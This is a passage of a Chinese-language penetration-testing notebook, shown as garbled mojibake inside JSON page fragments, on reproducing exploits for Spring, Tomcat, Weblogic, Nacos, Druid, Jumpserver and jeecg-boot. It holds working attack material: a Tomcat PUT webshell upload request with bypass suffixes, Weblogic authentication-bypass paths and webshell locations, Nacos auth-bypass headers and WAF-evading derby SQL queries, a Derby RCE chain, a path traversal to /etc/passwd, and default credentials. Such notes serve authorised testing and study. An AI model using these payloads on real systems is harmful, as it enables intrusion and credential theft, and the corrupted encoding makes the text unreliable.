éœ€è¦æ³¨æ„çš„æ˜¯payload ä¸­çš„ 'T5' æ–¹æ³•æ¯ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤åéƒ½éœ€è¦æ›´æ¢åç§° (å¦‚ T6) ï¼Œç„¶åæ‰èƒ½è¢«é‡æ–°åˆ›å»ºä½¿ç”¨ï¼Œå¦åˆ™ä¸‹æ¬¡ restart é‡å¯åº”ç”¨æ—¶æ¼æ´ä¸ä¼šè¢«è§¦å‘ Spring Cloud Gateway SPEL RCE Spring Cloud Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå½“æ”»å‡»è€…å¯ä»¥è®¿é—®Actuator APIçš„æƒ…å†µä¸‹ï¼Œå°†å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ ç‰ˆæœ¬å½±å“ Spring Cloud Gateway 3.1.0 3.0.0 to 3.0.6 Older, unsupported versions are also affected å¤ç° æ·»åŠ ä¸€ä¸ªåŒ…å«æ¶æ„SpELè¡¨è¾¾å¼çš„è·¯ç”±/actuator/gateway/routes/hacktest åº”ç”¨åˆšæ·»åŠ çš„è·¯ç”±/actuator/gateway/refresh è®¿é—®æ¶æ„è·¯ç”±å¾—åˆ°ç»“æœ/actuator/gateway/routes/hacktest Cloud Function SPEL RCE Spring Cloud Function æ˜¯Spring cloudä¸­çš„serverlessæ¡†æ¶ã€‚ Spring Cloud Function ä¸­çš„ RoutingFunction ç±»çš„ apply æ–¹æ³•å°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-expressionâ€å‚æ•°ä½œä¸º Spel è¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆ Spel è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚ æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ ç‰ˆæœ¬å½±å“ org.springframework.cloud:spring-cloud-function-contextï¼ˆå½±å“ç‰ˆæœ¬ï¼š3.0.0.RELEASE~3.2.2ï¼‰ å¤ç° acceptéœ€è¦ä¿®æ”¹ spring-core-rce ç‰ˆæœ¬å½±å“ ä½¿ç”¨JDK9åŠä»¥ä¸Šç‰ˆæœ¬çš„Spring MVCæ¡†æ¶ spring-webmvc æˆ– spring-webfluxä¾èµ– spring framework 5.3.0-5.3.17ã€5.2.0-5.2.19ç‰ˆæœ¬ï¼Œä»¥åŠæ›´æ—©çš„ç‰ˆæœ¬ å¤ç° è¿™é‡Œç¯å¢ƒç”¨vulfocusçš„ï¼Œvulhubçš„ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œ docker pull vulfocus/spring-core-rce-2022-03-29 docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29 æ”»å‡»åŸç† é€šè¿‡ä¿®æ”¹Tomcatçš„æ—¥å¿—è·¯å¾„ä¸åç¼€å†™å…¥jspæœ¨é©¬ è„šæœ¬ï¼šhttps://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å‘webhsellè¯·æ±‚æ—¶éƒ½ä¼šå†æ¬¡å‘å…¶å†™å…¥æœ¨é©¬å†…å®¹ å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚è¿›è¡Œæ¸…é™¤ /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹æ³•ä¼šä¿®æ”¹ç›®æ ‡æœåŠ¡å™¨é…ç½®ï¼Œå¯¼è‡´ç›®æ ‡éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½æ¢å¤ï¼Œå®é™…æµ‹è¯•ä¸­éœ€è¦æ ¼å¤–æ³¨æ„ã€‚ æƒé™ç»•è¿‡ /admin/%0a /admin/%0d # CVE-2023-20860 /admin/** å¤ç° å‚è€ƒæ–‡ç«  LandGrey/SpringBootVulExploit: SpringBoot ç›¸å…³æ¼æ´å­¦ä¹ èµ„æ–™ï¼Œåˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§åˆé›†ï¼Œé»‘ç›’å®‰å…¨è¯„ä¼° check list https://xz.aliyun.com/t/9763 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:47:24 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Tomcat.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Tomcat.html","title":"Tomcatæ¼æ´","keywords":"","body":"ç¯å¢ƒæ­å»º vulhub Tomatäº†è§£ ç›®å½•ç»“æ„ webapps 1. binç›®å½•: å­˜æ”¾ä¸€äº›äºŒè¿›åˆ¶çš„æ–‡ä»¶ï¼Œä¾‹å¦‚Tomcatå¸¸ç”¨çš„ å¯åŠ¨è„šæœ¬: startup.batæˆ–startup.sh å…³é—­è„šæœ¬: shutdown.bat æˆ– shutdown.shç­‰ç­‰ 2. confç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„é…ç½®æ–‡ä»¶ server.xmlï¼šå¯ä»¥è®¾ç½®ç«¯å£å·ã€è®¾ç½®åŸŸåæˆ–IPã€é»˜è®¤åŠ è½½çš„é¡¹ç›®ã€è¯·æ±‚ç¼–ç  web.xmlï¼šéƒ¨ç½²æè¿°æ–‡ä»¶ï¼Œè¿™ä¸ªweb.xmlä¸­æè¿°äº†ä¸€äº›é»˜è®¤çš„servletï¼Œéƒ¨ç½²æ¯ä¸ªwebappæ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œé…ç½®è¯¥webåº”ç”¨çš„é»˜è®¤servlet context.xmlï¼šå¯ä»¥ç”¨æ¥é…ç½®æ•°æ®æºä¹‹ç±»çš„ tomcat-users.xmlï¼šç”¨æ¥é…ç½®ç®¡ç†tomcatçš„ç”¨æˆ·ä¸æƒé™ Catalina:å¯ä»¥è®¾ç½®é»˜è®¤åŠ è½½çš„é¡¹ç›® 3. libç›®å½•: å­˜æ”¾çš„æ˜¯å…¨å±€çš„jaråŒ… 4. logsç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„æ—¥å¿—ï¼Œå¦‚æœTomcatå‡ºé”™ä»€ä¹ˆçš„ï¼Œå°±éœ€è¦åœ¨è¿™é‡Œçš„æ—¥å¿—ä¸­æŸ¥æ‰¾é—®é¢˜ 5. tempç›®å½•: å­˜æ”¾çš„æ˜¯ä¸´æ—¶æ€§çš„æ–‡ä»¶ 6. webappsç›®å½•: å­˜æ”¾çš„æ˜¯Javaçš„Webé¡¹ç›®ï¼Œè¦éƒ¨ç½²çš„é¡¹ç›®å°±éœ€è¦æ”¾åœ¨è¿™ä¸ªç›®å½•å½“ä¸­ 7. workç›®å½•: å­˜æ”¾çš„æ˜¯ç”±JSPä»£ç ç¿»è¯‘çš„Javaä»£ç ï¼Œä»¥åŠç¼–è¯‘çš„.classæ–‡ä»¶ fofaè¯­æ³• title=\"Apache Tomcat\" server=\"Tomcat\" ç‰ˆæœ¬å·ï¼šåœ¨Tomcatåé¢æ·»åŠ /x.x Tomcatæ¼æ´ managerå¼±å£ä»¤+éƒ¨ç½²waråŒ…getshell å½±å“ç‰ˆæœ¬ Tomcat7+æˆ–è€…é…ç½®é”™è¯¯ å¤ç° conf/tomcat-users.xmlä¸­ä¿å­˜äº†ç™»å½•å‡­è¯ï¼Œå¯¼è‡´å¯èƒ½å­˜åœ¨å¼±å£ä»¤æ¼æ´ï¼Œä»è€Œèƒ½è®¿é—®Manager APPä¸Šä¼ åé—¨ã€‚ è¿›å…¥managerç•Œé¢åå¯ä»¥éƒ¨ç½²waråŒ… â€‹ waråŒ…ä¸ºjspå‹ç¼©æ–‡ä»¶ï¼ˆjar cvf xxx.jspï¼‰ï¼ŒTomcatä¼šè‡ªåŠ¨è§£å‹ï¼Œ å¦‚å°†shell.jspæ‰“åŒ…ä¸ºshell.warï¼ŒTomcatä¼šå°†å…¶è§£å‹ä¸º/shell/shell.jsp ä¿®å¤æ–¹æ¡ˆ åˆ é™¤manageç›®å½•æˆ–è€…ä¿®æ”¹conf/tomcat-users.xmlä¸­çš„ç”¨æˆ·å‡­è¯ PUTä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰ å½±å“ç‰ˆæœ¬ 7.0.0 å¤ç° conf/web.xmlæ–‡ä»¶é…ç½®äº†readonly=falseï¼Œå¯¼è‡´å¯ä»¥å†™æ–‡ä»¶ PUT /1.jsp/ HTTP/1.1 Host: 192.168.174.129:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 693 shell éœ€è¦è¿›è¡Œç»•è¿‡ Windowsï¼š 1ã€åˆ©ç”¨/shell.jsp::$DATAçš„æ–¹å¼ç»•è¿‡ 2ã€/shell.jsp%20ï¼Œç©ºæ ¼ç»•è¿‡ 3ã€/shell.jsp/ ï¼Œ Tomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„/ Linuxï¼š 1ã€/shell.jsp/ ï¼Œ Tomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„/ è¿”å›201è¡¨ç¤ºä¸Šä¼ æˆåŠŸ ä¿®å¤æ–¹æ¡ˆ conf/web.xmlæ–‡ä»¶é…ç½®readonlyå€¼ä¸ºTrueæˆ–æ³¨é‡Šè¯¥å‚æ•° AJPæ–‡ä»¶åŒ…å«/è¯»å–--Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰ å½±å“ç‰ˆæœ¬ æ¼æ´å±å®³ å¤ç° python2è¿è¡Œ å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ æ¼æ´æ£€æµ‹ä¸ä¿®å¤ CVE-2020-1938:Tomcat AJPåè®®æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ | å›å¿†é£˜å¦‚é›ª (gv7.me) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:47:35 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Weblogic.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/Weblogic.html","title":"Weblogicæ¼æ´","keywords":"","body":"Weblogicæ§åˆ¶å°ä¸­æ–‡æ˜¾ç¤ºè¿˜æ˜¯è‹±æ–‡æ˜¾ç¤ºï¼Œæµè§ˆå™¨è¯­è¨€è®¾ç½®å†³å®šçš„_sxuskyçš„åšå®¢-CSDNåšå®¢ ç‰¹å¾ ç¬¬ä¸€æ¬¡è®¿é—®è·¯å¾„ /console ç®¡ç†å°é¡µé¢å’Œç‰ˆæœ¬ ç‰ˆæœ¬å·åˆ¤æ–­ ç¬¬21ç¯‡ï¼šåˆ¤æ–­Weblogicè¯¦ç»†ç‰ˆæœ¬å·çš„æ–¹æ³•æ€»ç»“ (qq.com) æ¼æ´å¤ç° Weblogicæ´å®åœ¨å¤ªå¤šäº†ã€‚ã€‚ é…åˆæ–‡ä»¶è¯»å–æ¥è¯»å–ç®¡ç†å‘˜è´¦å¯† config.xmlï¼šæœç´¢ å¯†ç è§£å¯† å¯†é’¥ï¼šSerializedSystemIni.datï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½¿ç”¨burpä¿å­˜ï¼‰ è§£å¯† è¿›å…¥ç®¡ç†ç•Œé¢éƒ¨ç½²waråŒ… è®¿é—®shell/shell.jsp æ–‡ä»¶åŒ…å«--CVE-2022-21371 å½±å“ç‰ˆæœ¬ï¼š12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 GET .//META-INF/MANIFEST.MF GET .//WEB-INF/web.xml GET .//WEB-INF/portlet.xml GET .//WEB-INF/weblogic.xml SSRF-CVE-2014-4210 æ¼æ´ä½ç½®åœ¨uddiexplorer/SearchPublicRegistries.jsp æœç´¢An error has occurredå®šä½è¿”å›å€¼ è®¿é—®å­˜åœ¨çš„ç«¯å£ï¼Œè¿”å›çŠ¶æ€ç  è®¿é—®ä¸å­˜åœ¨çš„ç«¯å£ï¼Œè¿”å›could not connect over HTTP to server å¦‚æœè®¿é—®çš„ç«¯å£ä¸æ˜¯httpåè®®ï¼Œåˆ™ä¼šè¿”å›did not have a valid SOAP content-type æœåŠ¡æ¢æµ‹æ€»ç»“ SSRFæ‰“Redis åœ¨Weblogicçš„SSRFä¸­ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå°±æ˜¯è™½ç„¶æ˜¯ä¸€ä¸ªâ€œGETâ€è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰ https://paper.seebug.org/647 äº§ç”ŸåŸå›  éœ€è¦çŸ¥é“éƒ¨ç½²åº”ç”¨çš„webç›®å½• å¼€å¯äº†Web Service Test Pageï¼Œå¼€å‘æ¨¡å¼ä¸‹å¯æœªæˆæƒè®¿é—®/ws_utc/Config.doæˆ–è€…è®¤è¯åè®¿é—®/ws_utc/begin.do å¤ç° é¦–å…ˆéœ€è¦è®¾ç½®home dirä¸ºé™æ€ç›®å½• /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css Config.do è¿”å›çš„æ•°æ®åŒ… ä¸Šä¼ åçš„æ–‡ä»¶ä½ç½® /ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å] begin.do å°†å‘é€çš„æ—¶é—´æˆ³è¿›è¡Œè½¬æ¢ï¼š2023-08-19 06:27:55.426 æœåŠ¡å™¨å®é™…ä¸Šçš„ æ‰€ä»¥æ¯«ç§’å¤„éœ€è¦è¿›è¡Œçˆ†ç ´ ä¸Šä¼ åçš„æ–‡ä»¶ä½ç½® /ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[æ¯«ç§’]/import_file_name_[æ–‡ä»¶å] èº«ä»½æ ¡éªŒç»•è¿‡ # CVE-2020-14750 /console/images/%252E./console.portal /console/css/%252E./console.portal # CVE-2020-14882 /console/css/%252e%252e%252fconsole.portal /console/images/%252e%252e%252fconsole.portal ååºåˆ—åŒ–æ¼æ´ Weblogicæ¼æ´å­¦ä¹ ï¼šT3ååºåˆ—åŒ– - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Weblogic Xmldecoderååºåˆ—åŒ–ä¸­çš„å‘½ä»¤å›æ˜¾ä¸å†…å­˜é©¬æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡ åˆ©ç”¨T3åè®®/IIOPåè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ® é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚ T3åè®®æ•°æ®åŒ… ç¬¬äºŒåˆ°ç¬¬ä¸ƒéƒ¨åˆ†å†…å®¹ï¼Œå¼€å¤´éƒ½æ˜¯ac ed 00 05ï¼Œè¯´æ˜è¿™äº›éƒ½æ˜¯åºåˆ—åŒ–çš„æ•°æ®ã€‚åªè¦æŠŠå…¶ä¸­ä¸€éƒ¨åˆ†æ›¿æ¢æˆæˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®å°±å¯ä»¥äº† Payloadæ•°æ®åŒ… é—®é¢˜ wafç»•è¿‡ https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA æ–‡ä»¶åŒ…å«åˆ¤æ–­ç‰ˆæœ¬å·ï¼Ÿ weblogic_scanner è¿™ä¸ªå·¥å…·ç»å¸¸æç¤ºéœ€è¦è¿›ä¸€æ­¥éªŒè¯çš„ä¸¤ä¸ªæ¼æ´ï¼ˆæ²¡æˆåŠŸè¿‡ã€‚ã€‚ï¼‰ CVE-2019-2618ï¼šéœ€è¦çŸ¥é“weblogicçš„ç®¡ç†å‘˜è´¦å¯†è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šæ¬¡ä¸Šä¼  CVE-2019-2888ï¼šå…ˆèµ·ä¸€ä¸ªæ¶æ„çš„xxeæœåŠ¡ï¼Œå†ç”¨expæ‰“ Webè·¯å¾„ è®°ä¸€æ¬¡æ›²æŠ˜çš„weblogicä¸Šä¼ webshell | chaser's Blog (chaserw.github.io) å‡è®¾ä¸Šä¼ çš„jspä¸ºshell.jsp # ç‰©ç†è·¯å¾„ /Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp # è®¿é—®è·¯å¾„ https://xx.com/console/framework/skins/wlsconsole/images/shell.jsp # ç‰©ç†è·¯å¾„ /Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/éšæœºå­—ç¬¦/war/shell.jsp # è®¿é—®è·¯å¾„ https://xx.com/bea_wls_internal/shell.jsp # ç‰©ç†è·¯å¾„ /Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/éšæœºå­—ç¬¦/war/shell.jsp # è®¿é—®è·¯å¾„ https://xx.com/uddiexplorer/shell.jsp # ç‰©ç†è·¯å¾„ /Oracle/Middleware/user_projects/domains/application/servers/AdminServer/tmp/_WL_user/é¡¹ç›®å/éšæœºå­—ç¬¦/war/shell.jsp # è®¿é—®è·¯å¾„ https://xx.com/é¡¹ç›®å/shell.jsp Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:48:06 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/åº”ç”¨è®°å½•.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/åº”ç”¨è®°å½•.html","title":"æ¸—é€ä¸­å¸¸è§åº”ç”¨è®°å½•","keywords":"","body":"Webåº”ç”¨ CMS é˜¿é‡Œç³» JAVA å›½å†…è½¯ä»¶ æ•°æ®åº“ API äº‘ç›¸å…³ Laravel druid monitor fastjson ç•…æ· å¸¸è§æ•°æ®åº“ Wsdlæ¥å£ OSS ThinkPHP Nacos log4j æµ·åº·å¨è§† Redis Swaggeræ¥å£ dockeré€ƒé€¸ Drupal hessianç»„ä»¶ Thymeleaf å„ç§OA ES Webpack Minio DeadCMS Weblogic H3C MQTTï¼ˆç‰©è”ç½‘åè®®ï¼‰ GraphQL Harbor Wordpress shiro é‡‘è¶äº‘æ˜Ÿç©º Rancher Joomla spring jeecg-boot JBOSS è‹¥ä¾ å¸†è½¯ phpstudy æ³›å¾® æ³›å¾®äº‘æ¡¥ https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w æ³›å¾® Nacos ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®å’ŒæœåŠ¡ç®¡ç†å¹³å°ï¼Œç”¨äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨ç¨‹åºã€‚ é»˜è®¤å¼€æ”¾åœ¨åœ¨8848ç«¯å£+/nacosï¼Œé»˜è®¤å£ä»¤nacos/nacos RCE Nacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) c0olw/NacosRce: Nacos JRaft Hessian ååºåˆ—åŒ– RCE åŠ è½½å­—èŠ‚ç  æ³¨å…¥å†…å­˜é©¬ ä¸å‡ºç½‘åˆ©ç”¨ (github.com) é‰´æƒç›¸å…³ ç›¸å…³æ¥å£ ç”¨æˆ·æŸ¥çœ‹ /nacos/v1/auth/users?pageNo=1&pageSize=2&search=blur ç”¨æˆ·æ³¨å†Œ /nacos/v1/auth/users POSTï¼šusername=crow&password=crow&search=blur /nacos/v1/auth/users?username=crow&password=crow&search=blur é…ç½®ä¿¡æ¯ç›¸å…³ /nacos/v1/console/namespaces # æŸ¥çœ‹å‘½åç©ºé—´ /v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 # æŸ¥çœ‹pubilcé…ç½® /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=namespace # æŸ¥çœ‹æŒ‡å®šå‘½åç©ºé—´é…ç½® nacos/v1/cs/configs?export=true&tenant=namespace&group=&appName=&ids= # å¯¼å‡ºæŒ‡å®šå‘½åç©ºé—´é…ç½® æƒé™ç»•è¿‡ -User-Agent: Nacos-Serverï¼ˆä½ç‰ˆæœ¬ç›´æ¥è®¿é—®urlï¼Œ1.2~1.4å¯ä»¥å°è¯•æ·»åŠ UAå¤´æ¥ç»•è¿‡é‰´æƒï¼‰ -serverIdentity: securityï¼ˆnacoså¼€å¯æƒé™è®¤è¯çš„é»˜è®¤å€¼ï¼‰ -example:example -test:test Nacos é»˜è®¤ secret.key é…ç½®ä¸å½“æƒé™ç»•è¿‡æ¼æ´ï¼ˆCNVD-2023674205ï¼‰ -Nacos nacosä½¿ç”¨å¤–ç½®derbyæ•°æ®åº“æ²¡æœ‰é‰´æƒå¯¼è‡´çš„ä»»æ„selectæŸ¥è¯¢æ“ä½œ ```bash /nacos/v1/cs/ops/derby?sql=select from sys.systables # æ‰€æœ‰è¡¨ /nacos/v1/cs/ops/derby?sql=select from CONFIG_INFO # å½“å‰é…ç½® /nacos/v1/cs/ops/derby?sql=select from HIS_CONFIG_INFO # å†å²é…ç½® /nacos/v1/cs/ops/derby?sql=select from users # ç”¨æˆ· bypass /nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*--/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom--/&sql=/%0ausers derbyæ•°æ®åº“å¦‚ä½•å®ç°RCE - lvyyevd's å®‰å…¨åšå®¢ http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce - å¯†ç è§£å¯† ```bash nacosä½¿ç”¨çš„åŠ å¯†æ–¹å¼ä¸ºBcryptåŠ å¯†ï¼Œç ´è§£å°å·¥å…·https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar å·¥å…· pap1rman/postnacos: å“¥æ–¯æ‹‰nacosåæ¸—é€æ’ä»¶ maketoken adduser (github.com) charonlight/NacosExploitGUI: Nacosç»¼åˆæ¼æ´åˆ©ç”¨GUIå·¥å…·ï¼Œé›†æˆäº†é»˜è®¤å£ä»¤æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ã€ååºåˆ—åŒ–æ¼æ´çš„æ£€æµ‹åŠå…¶åˆ©ç”¨ (github.com) Nacos derby Rce æ¡ä»¶ Nacosç‰ˆæœ¬2.3.2æˆ–è€…2.4.0ç­‰ èƒ½è®¿é—®removalå’Œderbyæ¥å£ï¼ˆæƒé™é—®é¢˜ï¼‰ expåˆ©ç”¨ VPSèµ·æ¶æ„ç±»ï¼Œåˆ©ç”¨removalæ¥å£åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œæœ€ååˆ©ç”¨derbyæ¥å£æ‰§è¡Œsqlè¯­å¥ï¼ˆæ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ï¼‰ removalæ¥å£ä¼šéå†å¹¶æ‰§è¡Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œè¿™é‡Œç›¸å½“äºç»™äº†ä¸¤ä¸ªæ¡ä»¶ï¼š 1. å¯ä»¥æ‰§è¡Œä»»æ„SQLè¯­å¥ 2. å¯ä»¥æ‰§è¡Œå¤šä¸ªSQLè¯­å¥ ä¿®æ”¹æ¶æ„ç±»å†…å®¹æ¥æ‰§è¡Œç›¸å…³æ“ä½œ # è°ƒç”¨sqlj.install_jaræ–¹æ³•å®‰è£…ä¸€ä¸ªjaråŒ… CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\\n # è°ƒç”¨SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTYæ–¹æ³•è®¾ç½®æ•°æ®åº“å±æ€§,derby.database.classpathå®šä¹‰äº†æ•°æ®åº“çš„ç±»è·¯å¾„ï¼Œå³å¯ä»¥åœ¨æ•°æ®åº“ä¸­è°ƒç”¨jaråŒ…ä¸­çš„æ–¹æ³• CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\\n # åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° CREATE FUNCTION S_EXAMPLE_1(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) # è¿”å›æœ€å¤š 2000 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec' # æŒ‡å®šäº†å®ç°è¯¥å‡½æ•°çš„å¤–éƒ¨ Java æ–¹æ³•çš„å®Œå…¨é™å®šåï¼Œtest.poc åŒ…ä¸­çš„ Example ç±»çš„ exec æ–¹æ³• # è°ƒç”¨è‡ªå®šä¹‰å‡½æ•° SELECT S_EXAMPLE_1('ä¼ å‚') Nacos Jraft Hessianååºåˆ—åŒ– https://mp.weixin.qq.com/s/0J0K0iY3bcmYcOuPGymAlQ 1.4.1 1.4.0ã€2.0.0 â€‹ Alibaba druid monitor Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ±  ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§. æœªæˆæƒè®¿é—®è·¯å¾„ï¼š /druid/index.html /druid/websession.html /druid/weburi.html /druid/basic.json /druid/websession.json /druid/weburi.json éœ€è¦ç™»é™†çš„è¯ï¼Œç™»å½•å…¥å£è·¯å¾„ï¼š /druid/login.html åˆ©ç”¨å§¿åŠ¿ï¼š Sessionç›‘æ§è·å–ç”¨æˆ·èº«ä»½ï¼ˆsessionå¯èƒ½æ˜¯è¿‡æœŸçš„æ— ç”¨ï¼Œéœ€è¦çˆ†ç ´éªŒè¯;ç½‘ç«™ä¸ä½¿ç”¨sessionæ¥è¿›è¡Œé‰´æƒï¼Œæ‰€ä»¥æ— ç”¨ï¼‰ URIè·å–åå°è·¯å¾„ï¼šæµ‹è¯•æœªæˆæƒè®¿é—®ï¼Œæˆ–è€…é…åˆsessionè¿›è¡Œåå°æ“ä½œ Jumpserver /api/v1/terminal/sessions/ # è·å–æ•æ„Ÿä¿¡æ¯å½•åƒ /api/v1/ops/playbook/e0adabef-c38f-492d-bd92-832bacc3df5f/file/?key=../../../../../../../etc/passwd # ç™»å½•åæ‰èƒ½ä½¿ç”¨ jeecg-boot ç»„ä»¶ /jeecg-boot/druid/index.html # admin/123456 /jeecg-boot/actuator # ä¸€èˆ¬å­˜åœ¨httptraceç«¯ç‚¹ 